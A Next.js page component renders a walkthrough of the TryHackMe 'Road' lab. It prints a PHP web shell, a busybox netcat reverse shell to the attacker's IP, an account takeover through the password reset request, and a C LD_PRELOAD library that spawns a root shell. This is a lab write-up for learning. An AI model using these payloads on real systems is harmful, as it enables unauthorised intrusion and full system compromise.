import React from "react";
import Code from "@/components/Code";
import Link from "next/link";
import Image from "next/image";
import image1 from "@/public/mdtotsx/RoadWalkthrough/image1.png";
import image2 from "@/public/mdtotsx/RoadWalkthrough/image2.png";
import image3 from "@/public/mdtotsx/RoadWalkthrough/image3.png";
import image4 from "@/public/mdtotsx/RoadWalkthrough/image4.png";
import image5 from "@/public/mdtotsx/RoadWalkthrough/image5.png";
import image6 from "@/public/mdtotsx/RoadWalkthrough/image6.png";
import image7 from "@/public/mdtotsx/RoadWalkthrough/image7.png";
import image8 from "@/public/mdtotsx/RoadWalkthrough/image8.png";
import image9 from "@/public/mdtotsx/RoadWalkthrough/image9.png";
import image10 from "@/public/mdtotsx/RoadWalkthrough/image10.png";
import image11 from "@/public/mdtotsx/RoadWalkthrough/image11.png";
import image12 from "@/public/mdtotsx/RoadWalkthrough/image12.png";
import image13 from "@/public/mdtotsx/RoadWalkthrough/image13.png";
import image14 from "@/public/mdtotsx/RoadWalkthrough/image14.png";
import image15 from "@/public/mdtotsx/RoadWalkthrough/image15.png";
import image16 from "@/public/mdtotsx/RoadWalkthrough/image16.png";
import image17 from "@/public/mdtotsx/RoadWalkthrough/image17.png";
import image18 from "@/public/mdtotsx/RoadWalkthrough/image18.png";
import image19 from "@/public/mdtotsx/RoadWalkthrough/image19.png";
import image20 from "@/public/mdtotsx/RoadWalkthrough/image20.png";
import image21 from "@/public/mdtotsx/RoadWalkthrough/image21.png";
import image22 from "@/public/mdtotsx/RoadWalkthrough/image22.png";
import image23 from "@/public/mdtotsx/RoadWalkthrough/image23.png";
import image24 from "@/public/mdtotsx/RoadWalkthrough/image24.png";
import image25 from "@/public/mdtotsx/RoadWalkthrough/image25.png";
import image26 from "@/public/mdtotsx/RoadWalkthrough/image26.png";
import image27 from "@/public/mdtotsx/RoadWalkthrough/image27.png";

const RoadWalkthrough = () => {
  return (
    <>
  <p className='my-2'>Link: <Link href="https://tryhackme.com/room/road" target="_blank" rel="noopener noreferrer" className="text-secondary-foreground underline hover:text-secondary-foreground/80 transition-colors duration-100">https://tryhackme.com/room/road</Link></p>
  <h1 className="text-2xl font-bold my-4 text-secondary text-center md:text-start">Port Scan</h1>
  <p className='my-2'>I'm going to use     <code className="bg-accent text-white px-2 py-1 rounded text-sm font-mono">rustscan</code> to conduct my port scan, with any discovered ports being fed into Nmap to conduct version identification and run the default scripts against these ports.</p>
  <Code language="" code={`rustscan -a 10.10.18.71 -- -A -sC -sV`} />
  <div className="flex justify-center my-4"><Image src={image1} alt="" unoptimized className="max-w-full h-auto" /></div>
  <p className='my-2'>The port scan revealed only 2 open ports, with the following information:</p>
  <div className="overflow-x-auto my-4">
    <table className="table-auto border-collapse border border-gray-300 w-full text-left">

      <thead>

        <tr>

          <th className="border px-4 py-2 bg-secondary-foreground/40 font-semibold">Port</th>
          <th className="border px-4 py-2 bg-secondary-foreground/40 font-semibold">Service</th>
          <th className="border px-4 py-2 bg-secondary-foreground/40 font-semibold">Version</th>

        </tr>

      </thead>
      <tbody>

        <tr>

          <td className="border px-4 py-2">22</td>
          <td className="border px-4 py-2">SSH</td>
          <td className="border px-4 py-2">OpenSSH 8.2p1 Ubuntu 4</td>

        </tr>
        <tr>

          <td className="border px-4 py-2">80</td>
          <td className="border px-4 py-2">HTTP</td>
          <td className="border px-4 py-2">Apache httpd 2.4.41</td>

        </tr>

      </tbody>

    </table>
  </div>
  <hr className="bg-secondary/50 my-8 h-0.5" />
  <p className='my-2'>It's also a good idea to check for any UDP ports. Since UDP port scanning takes longer, I'm only going to scan for the top 100 ports initially.</p>
  <Code language="" code={`sudo nmap -v -Pn -n -sU --top-ports=100 --reason 10.10.18.71`} />
  <p className='my-2'>    <em>The results of this scan were inconclusive on what ports may be open.</em></p>
  <h1 className="text-2xl font-bold my-4 text-secondary text-center md:text-start">The Web App</h1>
  <p className='my-2'>With only two ports open, it's quite easy to decide where to start first, that being the web app on port 80.</p>
  <div className="flex justify-center my-4"><Image src={image2} alt="" unoptimized className="max-w-full h-auto" /></div>
  <p className='my-2'>While I start to explore the web app manually, I'm also going to start a Content Discovery Scan using     <code className="bg-accent text-white px-2 py-1 rounded text-sm font-mono">ffuf</code></p>
  <Code language="" code={`ffuf -ic -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .txt -r -u http://10.10.18.71/FUZZ`} />
  <p className='my-2'>At the bottom of the page I also see an email which implies the possible hostname of the site</p>
  <div className="flex justify-center my-4"><Image src={image3} alt="" unoptimized className="max-w-full h-auto" /></div>
  <p className='my-2'>I add this hostname to my     <code className="bg-accent text-white px-2 py-1 rounded text-sm font-mono">/etc/hosts</code> file and then load the page using <Link href="http://skycouriers.thm" target="_blank" rel="noopener noreferrer" className="text-secondary-foreground underline hover:text-secondary-foreground/80 transition-colors duration-100">http://skycouriers.thm</Link></p>
  <p className='my-2'>Selecting the "Merchant Central" button in the top right takes us to a login page (<Link href="http://skycouriers.thm/v2/admin/login.html" target="_blank" rel="noopener noreferrer" className="text-secondary-foreground underline hover:text-secondary-foreground/80 transition-colors duration-100">http://skycouriers.thm/v2/admin/login.html</Link>), with another button below it to register an account.</p>
  <div className="flex justify-center my-4"><Image src={image4} alt="" unoptimized className="max-w-full h-auto" /></div>
  <div className="flex justify-center my-4"><Image src={image5} alt="" unoptimized className="max-w-full h-auto" /></div>
  <p className='my-2'>The register options ask us to provide some basic information, which I fill out with the following:</p>
  <Code language="" code={`pentest@example.com
password@123
passowrd@123
0000000000`} />
  <p className='my-2'>I then get a notification my account has been created, before being redirected back to the login page.</p>
  <div className="flex justify-center my-4"><Image src={image6} alt="" unoptimized className="max-w-full h-auto" /></div>
  <p className='my-2'>I'm able to login with my account details and get taken to the page <Link href="http://skycouriers.thm/v2/index.php" target="_blank" rel="noopener noreferrer" className="text-secondary-foreground underline hover:text-secondary-foreground/80 transition-colors duration-100">http://skycouriers.thm/v2/index.php</Link></p>
  <div className="flex justify-center my-4"><Image src={image7} alt="" unoptimized className="max-w-full h-auto" /></div>
  <p className='my-2'>I begin exploring the authenticated side of the web app and come across a page that lets you edit account details: <Link href="http://skycouriers.thm/v2/profile.php" target="_blank" rel="noopener noreferrer" className="text-secondary-foreground underline hover:text-secondary-foreground/80 transition-colors duration-100">http://skycouriers.thm/v2/profile.php</Link></p>
  <div className="flex justify-center my-4"><Image src={image8} alt="" unoptimized className="max-w-full h-auto" /></div>
  <p className='my-2'>On this page you're able to edit your profile image, however, there's a note that only an admin has access to this feature and to contact the admin at the address     <code className="bg-accent text-white px-2 py-1 rounded text-sm font-mono">admin@sky.thm</code></p>
  <div className="flex justify-center my-4"><Image src={image9} alt="" unoptimized className="max-w-full h-auto" /></div>
  <p className='my-2'>Looking around further there's a page which allows you to update your account password (<Link href="http://skycouriers.thm/v2/ResetUser.php" target="_blank" rel="noopener noreferrer" className="text-secondary-foreground underline hover:text-secondary-foreground/80 transition-colors duration-100">http://skycouriers.thm/v2/ResetUser.php</Link>)</p>
  <div className="flex justify-center my-4"><Image src={image10} alt="" unoptimized className="max-w-full h-auto" /></div>
  <p className='my-2'>I make this request and analyse what data was sent in BurpSuite.</p>
  <div className="flex justify-center my-4"><Image src={image11} alt="" unoptimized className="max-w-full h-auto" /></div>
  <p className='my-2'>The request for updating an account's password also provides the account's email in the request body. It is possible that a vulnerability exists that would allow us to change another account's password, by providing that account's email. Since I want to gain access to the     <code className="bg-accent text-white px-2 py-1 rounded text-sm font-mono">admin@sky.thm</code> account to get access to the upload functionality I decide to target that account.</p>
  <p className='my-2'>I sent this request to the BurpSuite Repeater and replaced my email with     <code className="bg-accent text-white px-2 py-1 rounded text-sm font-mono">admin@sky.thm</code>.</p>
  <div className="flex justify-center my-4"><Image src={image12} alt="" unoptimized className="max-w-full h-auto" /></div>
  <p className='my-2'>I logout of my created account and attempt to login to the     <code className="bg-accent text-white px-2 py-1 rounded text-sm font-mono">admin@sky.thm</code> account with the password     <code className="bg-accent text-white px-2 py-1 rounded text-sm font-mono">password@123</code></p>
  <div className="flex justify-center my-4"><Image src={image13} alt="" unoptimized className="max-w-full h-auto" /></div>
  <p className='my-2'>Using this method I was able to login to the admin account.</p>
  <h2 className="text-xl font-semibold my-3 text-secondary text-center md:text-start">Profile Picture Upload</h2>
  <p className='my-2'>Now with an admin account I should be able to use the profile picture upload functionality that I'd discovered earlier.</p>
  <p className='my-2'>I plan to try and upload the following PHP web shell instead of an image. If the PHP file can be uploaded and accessed, then command injection should be possible.</p>
  <Code language="PHP" code={`<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    \{
        system($_GET['cmd']);
    \}
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>`} />
  <div className="flex justify-center my-4"><Image src={image14} alt="" unoptimized className="max-w-full h-auto" /></div>
  <p className='my-2'>The response to the update profile request is the same PHP document that lets you update your profile. However, the response also features a comment     <code className="bg-accent text-white px-2 py-1 rounded text-sm font-mono">/v2/profileimages/</code>, which is likely the endpoint for where profile images are saved.</p>
  <div className="flex justify-center my-4"><Image src={image15} alt="" unoptimized className="max-w-full h-auto" /></div>
  <p className='my-2'>Since the web shell uploaded has the filename uploaded, I navigated to <Link href="http://skycouriers.thm/v2/profileimages/webshell.php" target="_blank" rel="noopener noreferrer" className="text-secondary-foreground underline hover:text-secondary-foreground/80 transition-colors duration-100">http://skycouriers.thm/v2/profileimages/webshell.php</Link></p>
  <div className="flex justify-center my-4"><Image src={image16} alt="" unoptimized className="max-w-full h-auto" /></div>
  <p className='my-2'>Once loaded, I could see the input field for the web shell. I then tested it was working by trying to run the command     <code className="bg-accent text-white px-2 py-1 rounded text-sm font-mono">id</code>.</p>
  <div className="flex justify-center my-4"><Image src={image17} alt="" unoptimized className="max-w-full h-auto" /></div>
  <p className='my-2'>My next step was to get a reverse shell.</p>
  <p className='my-2'>To have a stable reverse shell I decided to use Penelope (<Link href="https://github.com/brightio/penelope" target="_blank" rel="noopener noreferrer" className="text-secondary-foreground underline hover:text-secondary-foreground/80 transition-colors duration-100">https://github.com/brightio/penelope</Link>) which can be downloaded and opened automatically with </p>
  <Code language="bash" code={`wget https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py`} />
  <p className='my-2'>Since Penelope by default will listen on port 4444 when using the method above, I decided to use a reverse shell payload with this port number as well.</p>
  <Code language="bash" code={`busybox nc 10.11.115.65 4444 -e bash`} />
  <div className="flex justify-center my-4"><Image src={image18} alt="" unoptimized className="max-w-full h-auto" /></div>
  <p className='my-2'>After executing the reverse shell payload in the web shell Penelope received the shell and automatically upgraded it.</p>
  <h1 className="text-2xl font-bold my-4 text-secondary text-center md:text-start">Privilege Escalation</h1>
  <p className='my-2'>Now with command execution on the system, the next step is to enumerate and locate areas where privilege escalation may be possible.</p>
  <div className="flex justify-center my-4"><Image src={image19} alt="" unoptimized className="max-w-full h-auto" /></div>
  <p className='my-2'>I find the credentials for the database inside the file     <code className="bg-accent text-white px-2 py-1 rounded text-sm font-mono">/var/www/html/v2/admin/reg.php</code>. However, this doesn't let us authenticate as root.</p>
  <p className='my-2'>I then found the user flag inside     <code className="bg-accent text-white px-2 py-1 rounded text-sm font-mono">/home/webdeveloper/user.txt</code></p>
  <div className="flex justify-center my-4"><Image src={image20} alt="" unoptimized className="max-w-full h-auto" /></div>
  <p className='my-2'>I enumerated the currently running processes with the command</p>
  <Code language="bash" code={`ps aux`} />
  <div className="flex justify-center my-4"><Image src={image21} alt="" unoptimized className="max-w-full h-auto" /></div>
  <p className='my-2'>This revealed that     <code className="bg-accent text-white px-2 py-1 rounded text-sm font-mono">mongodb</code> was actively running on the system.</p>
  <h2 className="text-xl font-semibold my-3 text-secondary text-center md:text-start">MongoDB</h2>
  <p className='my-2'>To connect to the MongoDB I entered the command:</p>
  <Code language="bash" code={`mongo`} />
  <p className='my-2'>To list all the databases I used</p>
  <Code language="Mongo" code={`show dbs`} />
  <div className="flex justify-center my-4"><Image src={image22} alt="" unoptimized className="max-w-full h-auto" /></div>
  <p className='my-2'>To select the backup database I used</p>
  <Code language="Mongo" code={`use backup`} />
  <p className='my-2'>To list the collections in the database I used</p>
  <Code language="Mongo" code={`show collections`} />
  <div className="flex justify-center my-4"><Image src={image23} alt="" unoptimized className="max-w-full h-auto" /></div>
  <p className='my-2'>Finally, to list the entries in the     <code className="bg-accent text-white px-2 py-1 rounded text-sm font-mono">user</code> collection, I ran the command</p>
  <Code language="" code={`db.user.find()`} />
  <div className="flex justify-center my-4"><Image src={image24} alt="" unoptimized className="max-w-full h-auto" /></div>
  <p className='my-2'>This contained the credentials for the     <code className="bg-accent text-white px-2 py-1 rounded text-sm font-mono">webdeveloper</code> user.</p>
  <h2 className="text-xl font-semibold my-3 text-secondary text-center md:text-start">webdeveloper</h2>
  <p className='my-2'>I connected to the webdeveloper user using SSH and entering their password when prompted</p>
  <Code language="bash" code={`ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" webdeveloper@skycouriers.thm`} />
  <p className='my-2'>I checked for any sudo privileges with the command</p>
  <Code language="" code={`sudo -l`} />
  <div className="flex justify-center my-4"><Image src={image25} alt="" unoptimized className="max-w-full h-auto" /></div>
  <p className='my-2'>    <Link href="https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html?highlight=LD_P#ld_preload--ld_library_path" target="_blank" rel="noopener noreferrer" className="text-secondary-foreground underline hover:text-secondary-foreground/80 transition-colors duration-100">HackTricks - LD_PRELOAD &amp; LD_LIBRARY_PATH Privilege Escalation</Link></p>
  <p className='my-2'>The LD_PRELOAD is used to specify one or more loaders that is loaded by the loader before all others. Since there is a binary which can be ran as sudo (    <code className="bg-accent text-white px-2 py-1 rounded text-sm font-mono">/usr/bin/sky_backup_utility</code>) I can abuse the LD_PRELOAD to gain access to a root shell.</p>
  <p className='my-2'>First, I need to create a small C program that will open the root terminal:</p>
  <Code language="C" code={`#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() \{
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
\}`} />
  <p className='my-2'>This code is then compiled into a shared library:</p>
  <Code language="" code={`gcc -fPIC -shared -o pe.so pe.c -nostartfiles`} />
  <p className='my-2'>Finally, to abuse the vulnerability and gain access to a root shell I specify the     <code className="bg-accent text-white px-2 py-1 rounded text-sm font-mono">LD_PRELOAD</code> shared library environment variable, which will execute before the     <code className="bg-accent text-white px-2 py-1 rounded text-sm font-mono">sky_backup_utility</code>.</p>
  <Code language="" code={`sudo LD_PRELOAD=./pe.so /usr/bin/sky_backup_utility`} />
  <div className="flex justify-center my-4"><Image src={image26} alt="" unoptimized className="max-w-full h-auto" /></div>
  <p className='my-2'>I now have access to root on the machine and can collect the final flag.</p>
  <div className="flex justify-center my-4"><Image src={image27} alt="" unoptimized className="max-w-full h-auto" /></div>
    </>
  );
};

export default RoadWalkthrough;
